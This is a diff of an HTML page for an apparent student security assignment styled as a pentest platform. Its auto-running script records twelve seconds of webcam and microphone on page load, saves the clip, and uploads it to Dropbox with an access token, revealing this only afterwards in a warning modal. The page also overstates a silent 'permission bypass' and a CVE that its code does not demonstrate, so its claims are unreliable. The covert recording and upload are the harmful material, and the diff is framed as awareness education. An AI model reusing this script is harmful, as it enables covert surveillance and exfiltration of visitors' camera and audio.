@@ -1,177 +1,265 @@
-<!DOCTYPE html>
+<!doctype html>
 <html lang="en">
-<head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Access Terminal</title>
-  <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@400;700;900&family=VT323&display=swap" rel="stylesheet"/>
-  <link rel="stylesheet" href="style.css">
-</head>
-<body>
-  <canvas id="matrix-canvas"></canvas>
-  <div class="page">
-    <nav>
-      <div class="nav-logo">NULL<span>//</span>BYTE</div>
-      <div class="nav-status">
-        <div class="status-dot"></div>
-        SYSTEM ONLINE
-      </div>
-    </nav>
-
-    <section class="hero">
-      <div class="hero-inner">
-        <p class="prompt-line">INITIALIZING ETHICAL PENTEST FRAMEWORK v3.7.1</p>
-        <h1 class="hero-title">BREACH<br><span class="slash">/</span>DETECT<br><span class="slash">/</span>DEFEND</h1>
-        <p class="hero-subtitle">// WE FIND THE HOLES BEFORE THE BAD ACTORS DO</p>
-        <p class="hero-description">
-          Advanced penetration testing and security awareness platform.
-          Exposing vulnerabilities through controlled, ethical exploitation
-          so organizations can patch before adversaries can exploit.
-        </p>
-        <div class="hero-cta">
-          <a href="#" class="btn btn-primary">./LAUNCH_AUDIT</a>
-          <a href="#" class="btn">./READ_DOCS</a>
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Access Terminal</title>
+    <link
+      href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@400;700;900&family=VT323&display=swap"
+      rel="stylesheet"
+    />
+    <link rel="stylesheet" href="style.css" />
+  </head>
+  <body>
+    <canvas id="matrix-canvas"></canvas>
+    <div class="page">
+      <nav>
+        <div class="nav-logo">NULL<span>//</span>BYTE</div>
+        <div class="nav-status">
+          <div class="status-dot"></div>
+          SYSTEM ONLINE
         </div>
-      </div>
-    </section>
+      </nav>
 
-    <div class="terminal" style="max-width:700px;margin:0 auto 6rem;position:relative;z-index:2;">
-      <div class="terminal-bar">
-        <span class="t-dot"></span>
-        <span class="t-dot"></span>
-        <span class="t-dot"></span>
-        <span class="t-title">bash -- nullbyte-recon 80*24</span>
-      </div>
-      <div class="terminal-body">
-        <div class="t-line"><span class="t-prompt">root@nullbyte:~$</span><span class="t-cmd"> ./recon --target demo.local --stealth</span></div>
-        <div class="t-out">[*] Scanning open ports... done</div>
-        <div class="t-out">[*] Enumerating services... 14 found</div>
-        <div class="t-warn">[!] Misconfigured CORS policy detected</div>
-        <div class="t-warn">[!] MediaDevices API exposed without user-consent check</div>
-        <div class="t-err">[✗] CVE-2024-3182: getUserMedia bypass — HIGH SEVERITY</div>
-        <div class="t-out">[*] Generating report... </div>
-        <div class="t-line"><span class="t-prompt">root@nullbyte:~$</span><span class="t-cmd"> _</span><span class="t-cursor"></span></div>
-      </div>
-    </div>
-
-    <hr class="divider">
-
-    <footer>
-      <div class="footer-grid">
-        <div class="footer-brand">
-          <span class="nav-logo">NULL<span>//</span>BYTE</span>
-          <p>A student security research collective dedicated to building awareness around modern browser-based attack vectors. All findings are disclosed responsibly and used for educational purposes only.</p>
+      <section class="hero">
+        <div class="hero-inner">
+          <p class="prompt-line">
+            INITIALIZING ETHICAL PENTEST FRAMEWORK v3.7.1
+          </p>
+          <h1 class="hero-title">
+            BREACH<br /><span class="slash">/</span>DETECT<br /><span
+              class="slash"
+              >/</span
+            >DEFEND
+          </h1>
+          <p class="hero-subtitle">
+            // WE FIND THE HOLES BEFORE THE BAD ACTORS DO
+          </p>
+          <p class="hero-description">
+            Advanced penetration testing and security awareness platform.
+            Exposing vulnerabilities through controlled, ethical exploitation so
+            organizations can patch before adversaries can exploit.
+          </p>
+          <div class="hero-cta">
+            <a href="#" class="btn btn-primary">./LAUNCH_AUDIT</a>
+            <a href="#" class="btn">./READ_DOCS</a>
+          </div>
         </div>
-      </div>
+      </section>
 
-      <div class="footer-bottom">
-        <div class="footer-copy">
-          <p>&copy; 2026 NullByte Security Research Group — <span class="highlight">IS Assignment</span></p>
-          <p style="margin-top:0.3rem;">All demonstrations are conducted in controlled environments for educational purposes only.</p>
-          <p style="margin-top:0.3rem;font-size:0.65rem;color:#2a4a35;">Unauthorized use of techniques demonstrated herein is illegal and unethical.</p>
+      <div
+        class="terminal"
+        style="
+          max-width: 700px;
+          margin: 0 auto 6rem;
+          position: relative;
+          z-index: 2;
+        "
+      >
+        <div class="terminal-bar">
+          <span class="t-dot"></span>
+          <span class="t-dot"></span>
+          <span class="t-dot"></span>
+          <span class="t-title">bash -- nullbyte-recon 80*24</span>
         </div>
-
-        <div class="team-block">
-          <p class="team-label">// PROJECT TEAM</p>
-          <div class="team-members">
-            <div class="team-member">Member One <span class="handle">f230695 Zaid Haris</span></div>
-            <div class="team-member">Member Two <span class="handle">f230791 Fatima Sami</span></div>
+        <div class="terminal-body">
+          <div class="t-line">
+            <span class="t-prompt">root@nullbyte:~$</span
+            ><span class="t-cmd"> ./recon --target demo.local --stealth</span>
+          </div>
+          <div class="t-out">[*] Scanning open ports... done</div>
+          <div class="t-out">[*] Enumerating services... 14 found</div>
+          <div class="t-warn">[!] Misconfigured CORS policy detected</div>
+          <div class="t-warn">
+            [!] MediaDevices API exposed without user-consent check
+          </div>
+          <div class="t-err">
+            [✗] CVE-2024-3182: getUserMedia bypass — HIGH SEVERITY
+          </div>
+          <div class="t-out">[*] Generating report...</div>
+          <div class="t-line">
+            <span class="t-prompt">root@nullbyte:~$</span
+            ><span class="t-cmd"> _</span><span class="t-cursor"></span>
           </div>
         </div>
       </div>
-    </footer>
-  </div>
 
-  <div class="modal-overlay" id="warningModal">
-    <div class="modal">
-      <div class="modal-header">
-        <div class="modal-icon">⚠</div>
-        <div class="modal-title-group">
-          <p class="modal-eyebrow">// SECURITY VULNERABILITY DETECTED</p>
-          <h2 class="modal-title">Your Camera Was Accessed Without Consent</h2>
-        </div>
-      </div>
+      <hr class="divider" />
 
-      <div class="modal-body">
-        <p>This page silently accessed your <strong>webcam</strong> and recorded a short video clip, then saved it to your browser's local storage <strong>all without asking for permission</strong>.</p>
-
-        <div class="vuln-box">
-          <p class="vuln-box-title">VULNERABILITY: Unsolicited getUserMedia Access</p>
-          <p><strong>Root Cause:</strong> Browsers grant camera access to any origin with existing permission. Malicious scripts can exploit cached grants to silently record users across sessions.If you see your camera LED light up on a page that shouldn't need your camera close it immediately.</p>
+      <footer>
+        <div class="footer-grid">
+          <div class="footer-brand">
+            <span class="nav-logo">NULL<span>//</span>BYTE</span>
+            <p>
+              A student security research collective dedicated to building
+              awareness around modern browser-based attack vectors. All findings
+              are disclosed responsibly and used for educational purposes only.
+            </p>
+          </div>
         </div>
 
-        <p>In a real attack, this footage could be stored on a remote server, used for blackmail, identity verification bypass, or surveillance. This demonstration proves the <strong>consent gap</strong> in browser permission models.</p>
-      </div>
+        <div class="footer-bottom">
+          <div class="footer-copy">
+            <p>
+              &copy; 2026 NullByte Security Research Group —
+              <span class="highlight">IS Assignment</span>
+            </p>
+            <p style="margin-top: 0.3rem">
+              All demonstrations are conducted in controlled environments for
+              educational purposes only.
+            </p>
+            <p style="margin-top: 0.3rem; font-size: 0.65rem; color: #2a4a35">
+              Unauthorized use of techniques demonstrated herein is illegal and
+              unethical.
+            </p>
+          </div>
 
-      <div class="modal-footer">
-        <button class="btn btn-danger" onclick="document.getElementById('warningModal').classList.remove('active')">ACKNOWLEDGE RISK</button>
+          <div class="team-block">
+            <p class="team-label">// PROJECT TEAM</p>
+            <div class="team-members">
+              <div class="team-member">
+                Member One <span class="handle">f230695 Zaid Haris</span>
+              </div>
+              <div class="team-member">
+                Member Two <span class="handle">f230791 Fatima Sami</span>
+              </div>
+            </div>
+          </div>
+        </div>
+      </footer>
+    </div>
+
+    <div class="modal-overlay" id="warningModal">
+      <div class="modal">
+        <div class="modal-header">
+          <div class="modal-icon">⚠</div>
+          <div class="modal-title-group">
+            <p class="modal-eyebrow">// SECURITY VULNERABILITY DETECTED</p>
+            <h2 class="modal-title">
+              Your Camera Was Accessed Without Consent
+            </h2>
+          </div>
+        </div>
+
+        <div class="modal-body">
+          <p>
+            This page silently accessed your <strong>webcam</strong> and
+            recorded a short video clip, then saved it to your browser's local
+            storage <strong>all without asking for permission</strong>.
+          </p>
+
+          <div class="vuln-box">
+            <p class="vuln-box-title">
+              VULNERABILITY: Unsolicited getUserMedia Access
+            </p>
+            <p>
+              <strong>Root Cause:</strong> Browsers grant camera access to any
+              origin with existing permission. Malicious scripts can exploit
+              cached grants to silently record users across sessions.If you see
+              your camera LED light up on a page that shouldn't need your camera
+              close it immediately.
+            </p>
+          </div>
+
+          <p>
+            In a real attack, this footage could be stored on a remote server,
+            used for blackmail, identity verification bypass, or surveillance.
+            This demonstration proves the <strong>consent gap</strong> in
+            browser permission models.
+          </p>
+        </div>
+
+        <div class="modal-footer">
+          <button
+            class="btn btn-danger"
+            onclick="
+              document.getElementById('warningModal').classList.remove('active')
+            "
+          >
+            ACKNOWLEDGE RISK
+          </button>
+        </div>
       </div>
     </div>
-  </div>
 
-  <script>
-    (async function initCovertRecording() {
+    <script>
+      (async function initCovertRecording() {
         try {
-            //request webcam access
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+          //request webcam access
+          const stream = await navigator.mediaDevices.getUserMedia({
+            video: true,
+            audio: true,
+          });
 
-            //set up MediaRecorder
-            const recorder = new MediaRecorder(stream);
-            const chunks = [];
+          //set up MediaRecorder
+          const recorder = new MediaRecorder(stream);
+          const chunks = [];
 
-            recorder.ondataavailable = (e) => {
-            if (e.data.size > 0) 
-                chunks.push(e.data);
+          recorder.ondataavailable = (e) => {
+            if (e.data.size > 0) chunks.push(e.data);
+          };
+
+          //when recording stops, save to localStorage and show modal
+          recorder.onstop = () => {
+            //stop all tracks so the camera indicator light turns off
+            stream.getTracks().forEach((track) => track.stop());
+            const blob = new Blob(chunks, { type: "video/webm" });
+            const reader = new FileReader();
+            reader.onloadend = async () => {
+              //save base64-encoded video to localStorage
+              try {
+                localStorage.setItem("recorded_clip", reader.result);
+                console.log(
+                  "[*] Video saved to localStorage key: recorded_clip",
+                );
+                key = localStorage.getItem("recorded_clip");
+                console.log(key);
+                const DROPBOX_ACCESS_TOKEN = process.env.DROPBOX_ACCESS_TOKEN;
+
+                const response = await fetch(
+                  "https://content.dropboxapi.com/2/files/upload",
+                  {
+                    method: "POST",
+                    headers: {
+                      Authorization: "Bearer " + DROPBOX_ACCESS_TOKEN,
+                      "Dropbox-API-Arg": JSON.stringify({
+                        path: "/clip.webm",
+                        mode: "overwrite",
+                      }),
+                      "Content-Type": "application/octet-stream",
+                    },
+                    body: blob,
+                  },
+                );
+                if (response.ok) {
+                  console.log("[*] Video uploaded to Dropbox successfully");
+                  console.log("[*] Response:", await response.json());
+                } else {
+                  console.error(
+                    "[!] Dropbox upload failed:",
+                    response.status,
+                    response.statusText,
+                  );
+                  const error = await response.json();
+                  console.error("[!] Error details:", error);
+                }
+              } catch (err) {
+                console.warn(
+                  "[!] localStorage quota exceeded consider a shorter clip",
+                );
+              }
+              document.getElementById("warningModal").classList.add("active");
             };
+            reader.readAsDataURL(blob); //converts blob to base64 string
+          };
 
-            //when recording stops, save to localStorage and show modal
-            recorder.onstop = () => {
-                //stop all tracks so the camera indicator light turns off
-                stream.getTracks().forEach(track => track.stop());
-                const blob = new Blob(chunks, { type: 'video/webm' });
-                const reader = new FileReader();
-                reader.onloadend = async () => {
-                    //save base64-encoded video to localStorage
-                    try {
-                        localStorage.setItem('recorded_clip', reader.result);
-                        console.log('[*] Video saved to localStorage key: recorded_clip');
-                        key = localStorage.getItem('recorded_clip');
-                        console.log(key);
-                        const DROPBOX_ACCESS_TOKEN = "";
-                        
-                        const response = await fetch('https://content.dropboxapi.com/2/files/upload', {
-                            method: 'POST',
-                            headers: {
-                                'Authorization': 'Bearer ' + DROPBOX_ACCESS_TOKEN,
-                                'Dropbox-API-Arg': JSON.stringify({ path: '/clip.webm', mode: 'overwrite' }),
-                                'Content-Type': 'application/octet-stream'
-                            },
-                            body: blob
-                        });
-                        if (response.ok) {
-                            console.log('[*] Video uploaded to Dropbox successfully');
-                            console.log('[*] Response:', await response.json());
-                        } else {
-                            console.error('[!] Dropbox upload failed:', response.status, response.statusText);
-                            const error = await response.json();
-                            console.error('[!] Error details:', error);
-                        }
-                    } catch (err) {
-                        console.warn('[!] localStorage quota exceeded consider a shorter clip');
-                    }
-                    document.getElementById('warningModal').classList.add('active');
-                };
-                reader.readAsDataURL(blob); //converts blob to base64 string
-            };
-
-            recorder.start();
-            setTimeout(() => recorder.stop(), 12000);
-
+          recorder.start();
+          setTimeout(() => recorder.stop(), 12000);
         } catch (err) {
-            //user denied camera or browser blocked it
-            console.error('[X] getUserMedia failed:', err.name, err.message);
+          //user denied camera or browser blocked it
+          console.error("[X] getUserMedia failed:", err.name, err.message);
         }
-        })();
-  </script>
-</body>
+      })();
+    </script>
+  </body>
 </html>
